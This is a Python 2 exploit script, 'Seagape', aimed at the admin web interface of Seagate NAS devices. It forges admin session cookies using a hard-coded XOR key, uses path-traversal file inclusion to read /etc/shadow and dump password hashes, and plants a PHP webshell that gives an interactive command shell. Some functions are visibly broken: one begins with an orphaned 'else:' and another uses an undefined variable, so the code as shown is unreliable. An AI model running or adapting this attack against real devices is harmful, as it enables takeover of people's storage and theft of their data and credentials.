#
# Seagape
# =======
# exploit as root user.
#
# by OJ Reeves (@TheColonial) - for full details please see
# https://beyondbinary.io/advisory/seagate-nas-rce/
#
# Usage
# =====
# seagape.py <ip> <port> [-c [ua]]
#
# - ip   : ip or host name of the target NAS
# - port : port of the admin web ui
# - -c   : (optional) create a cookie which will give admin access.
#          Not specifying this flag results in webshell installation.
# - ua   : (optional) the user agent used by the browser for the
#          admin session (UA must match the target browser).
#          Default value is listed below
#
# Example
# =======
# Install and interact with the web shell:
# seagape.py 192.168.0.1 80
#
# Create admin cookie
# seagape.py 192.168.0.1 80 -c
 
import base64
import hashlib
import itertools
import os
import re
import socket
import sys
import urllib
import urllib2
import uuid
import xml.sax.saxutils
 
if len(sys.argv) < 3:
    print "Usage: {0} <ip> <port> [-c [user agent]]".format(sys.argv[0])
    sys.exit(1)
 
# Every Seagate nas has the same XOR key. Great.
XOR_KEY = &#039;0f0a000d02011f0248000d290d0b0b0e03010e07&#039;
 
# This is the User agent we&#039;ll use for most of the requests
DEFAULT_UA = &#039;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10&#039;
 
# This is the description we&#039;re going to be reading from
LFI_FILE = &#039;/etc/devicedesc&#039;
 
# the base globals that will hold our state
host = sys.argv[1]
port = int(sys.argv[2])
cis = &#039;&#039;
hostname = &#039;&#039;
webshell = str(uuid.uuid1()) + ".php"
 
def chunks(s, n):
    for i in xrange(0, len(s), n):
        yield s[i:i + n]
 
def forward_interleave(a, b):
    return &#039;&#039;.join(itertools.chain(*zip(itertools.cycle(a), b)))
 
def xor(s, k):
    return &#039;&#039;.join(chr(ord(a) ^ ord(b)) for a, b in itertools.izip(s, itertools.cycle(k)))
 
def sha1(s):
    return hashlib.sha1(s).hexdigest()
 
def decode(s):
    f = xor(s, XOR_KEY)
    return &#039;&#039;.join(chr(ord(a) ^ ord(b)) for a, b in chunks(f, 2))
 
def encode(s):
    s = forward_interleave(sha1(s), s)
    s = &#039;&#039;.join(a + chr(ord(a) ^ ord(b)) for a, b in chunks(s, 2))
    return xor(s, XOR_KEY)
 
def make_request(uri = "/", ci_session = None, headers = None, post_data = None):
 
    method = &#039;GET&#039;
 
    if not headers:
        headers = {}
 
    headers[&#039;Host&#039;] = host
 
    if &#039;User-Agent&#039; not in headers:
        headers[&#039;User-Agent&#039;] = DEFAULT_UA
 
    if &#039;Accept&#039; not in headers:
        headers[&#039;Accept&#039;] = &#039;text/html&#039;
 
    if post_data:
        method = &#039;POST&#039;
        post_data = urllib.urlencode(post_data)
        headers[&#039;Content-Type&#039;] = &#039;application/x-www-form-urlencoded&#039;
 
    if ci_session:
        ci_session = urllib.quote(base64.b64encode(encode(ci_session)))
        headers[&#039;Cookie&#039;] = &#039;ci_session={0}&#039;.format(ci_session)
 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
 
    http  = ""
    http += "{0} {1} HTTP/1.1\r\n".format(method, uri)
 
    for h in headers:
        http += "{0}: {1}\r\n".format(h, headers[h])
 
    if post_data:
        http += "Content-Length: {0}\r\n".format(len(post_data))
 
    http += "\r\n"
 
    if post_data:
        http += post_data
 
    s.send(http)
 
    result = ""
    while True:
        data = s.recv(1024)
        if not data:
            break
        result += data
 
    s.close()
 
    return result
 
def get_ci_session():
    resp = make_request()
 
    for l in resp.split("\r\n"):
        m = re.findall("Set-Cookie: ([a-zA-Z0-9_\-]+)=([a-zA-Z0-9\+%=/]+);", l)
        for name, value in m:
            if name == &#039;ci_session&#039; and len(value) > 40:
                return decode(base64.b64decode(urllib.unquote(value)))
 
    print "Unable to establish session with {0}".format(host)
    sys.exit(1)
 
def add_string(ci_session, key, value):
    else:
        # doesn&#039;t exist, so we need to add it to the start and the end.
        count = int(ci_session.split(&#039;:&#039;)[1]) + 1
    return ci_session
 
def set_admin(ci_session):
    return add_string(ci_session, "is_admin", "yes")
 
def set_language(ci_session, lang):
    return add_string(ci_session, "language", lang)
 
def include_file(ci_session, file_path):
    if file_path[0] == &#039;/&#039;:
        file_path = &#039;../../../../../..&#039; + file_path
    return set_language(ci_session, file_path + "\x00")
 
def read_file(file_path, post_data = None):
    resp = make_request(ci_session = include_file(cis, file_path), headers = {}, post_data = post_data)
    return resp
 
def hashdump():
    shadow = read_file(&#039;/etc/shadow&#039;)
    for l in shadow.split("\n"):
        if l and &#039;:!:&#039; not in l and &#039;:x:&#039; not in l:
            parts = l.split(&#039;:&#039;)
            print "{0}:{1}".format(parts[0], parts[1])
 
def cmd(command):
    headers = {
        &#039;Content-Type&#039; : &#039;application/x-www-form-urlencoded&#039;,
        &#039;Accept&#039; : &#039;*/*&#039;,
        &#039;User-Agent&#039; : DEFAULT_UA
    }
 
    post_data = urllib.urlencode({&#039;c&#039; : command})
    headers[&#039;Content-Type&#039;] = &#039;application/x-www-form-urlencoded&#039;
 
    ci_session = urllib.quote(base64.b64encode(encode(cis)))
    headers[&#039;Cookie&#039;] = &#039;ci_session={0}&#039;.format(ci_session)
 
    url = &#039;http://{0}:{1}/{2}&#039;.format(host, port, webshell)
    req = urllib2.Request(url, headers = headers, data = post_data)
 
    return urllib2.urlopen(req).read()
 
def shell():
    running = True
    while running:
        c = raw_input("Shell ({0}) $ ".format(post_id))
        if c != &#039;quit&#039; and c != &#039;exit&#039;:
            cmd(c)
        else:
            running = False
 
def show_admin_cookie(user_agent):
    ci_session = add_string(cis, &#039;is_admin&#039;, &#039;yes&#039;)
    ci_session = add_string(ci_session, &#039;username&#039;, &#039;admin&#039;)
    ci_session = add_string(ci_session, &#039;user_agent&#039;, user_agent)
    ci_session = urllib.quote(base64.b64encode(encode(ci_session)))
    print "Session cookies are bound to the browser&#039;s user agent."
    print "Using user agent: " + user_agent
    print "ci_session=" + ci_session
 
def show_version():
    print "Firmware Version: {0}".format(get_firmware_version())
 
def show_cookie():
    print cis
 
def show_help():
    print ""
    print "Seagape v1.0 -- Interactive Seagate NAS Webshell"
    print "  - OJ Reeves (@TheColonial) - https://beyondbinary.io/"
    print "  - https://beyondbinary.io/bbsec/001"
    print "==========================================================================="
    print "version           - Print the current firmware version to screen."
    print "dumpcookie        - Print the current cookie to screen."
    print "admincookie <ua>  - Create an admin login cookie (ua == user agent string)."
    print "                    Add to your browser and access ANY NAS box as admin."
    print "help              - Show this help."
    print "exit / quit       - Run for the hills."
    print "<anything else>   - Execute the command on the server."
    print ""
 
def execute(user_input):
    result = True
    parts = user_input.split(&#039; &#039;)
    c = parts[0]
 
    if c == &#039;admincookie&#039;:
        ua = DEFAULT_UA
        if len(parts) > 1:
            ua = &#039; &#039;.join(parts[1:])
        show_admin_cookie(ua)
    elif c == &#039;dumpcookie&#039;:
        show_cookie()
    elif c == &#039;version&#039;:
        show_version()
    elif c == &#039;help&#039;:
        show_help()
    elif c == &#039;quit&#039; or c == &#039;exit&#039;:
        remove_shell()
        result = False
    else:
        print cmd(user_input)
    return result
 
def get_firmware_version():
    resp = make_request("/index.php/mv_system/get_firmware?_=1413463189043",
            ci_session = acis)
    return resp.replace("\r", "").replace("\n", "").split("version")[1][1:-2]
 
def install_shell():
    resp = make_request("/index.php/mv_system/get_general_setup?_=1413463189043",
            ci_session = acis)
    existing_setup = &#039;&#039;
    for l in resp.split("\r\n"):
        if &#039;general_setup&#039; in l:
            existing_setup = l
            break
 
    # generate the shell and its installer
    exec_post = base64.b64encode("<?php if(isset($_POST[&#039;c&#039;])&&!empty($_POST[&#039;c&#039;])){system($_POST[&#039;c&#039;]);} ?>")
    installer = &#039;<?php file_put_contents(\&#039;{0}\&#039;, base64_decode(\&#039;{1}\&#039;)); ?>&#039;.format(webshell, exec_post)
    write_php = xml.sax.saxutils.quoteattr(installer)[1:-1]
    start = existing_setup.index(&#039;" description="&#039;) + 15
    end = existing_setup.index(&#039;"&#039;, start)
    updated_setup = existing_setup[0:start] + write_php + existing_setup[end:]
 
    # write the shell to the description
    resp = make_request("/index.php/mv_system/set_general_setup?_=1413463189043",
            ci_session = acis,
            headers = { },
            post_data = { &#039;general_setup&#039; : updated_setup })
 
    # invoke the installer
    read_file(LFI_FILE)
 
    # remove the installer
    resp = make_request("/index.php/mv_system/set_general_setup?_=1413463189043",
            ci_session = acis,
            headers = { },
            post_data = { &#039;general_setup&#039; : existing_setup })
 
def remove_shell():
    return cmd(&#039;rm -f {0}&#039;.format(webshell))
 
print "Establishing session with {0} ...".format(host)
cis = get_ci_session()
 
if len(sys.argv) >= 4 and sys.argv[3] == &#039;-c&#039;:
    ua = DEFAULT_UA
    if len(sys.argv) > 4:
        ua = sys.argv[4]
    show_admin_cookie(ua)
else:
    print "Configuring administrative access ..."
    acis = add_string(cis, &#039;is_admin&#039;, &#039;yes&#039;)
    acis = add_string(acis, &#039;username&#039;, &#039;admin&#039;)
 
    print "Installing web shell (takes a while) ..."
    install_shell()
 
    print "Extracting id and hostname ..."
    identity = cmd(&#039;whoami&#039;).strip()
    hostname = cmd(&#039;cat /etc/hostname&#039;).strip()
    show_help()
 
    running = True
    while running:
        try:
            user_input = raw_input("Seagape ({0}@{1})> ".format(identity, hostname))
            running = execute(user_input)
        except:
            print "Something went wrong. Try again."

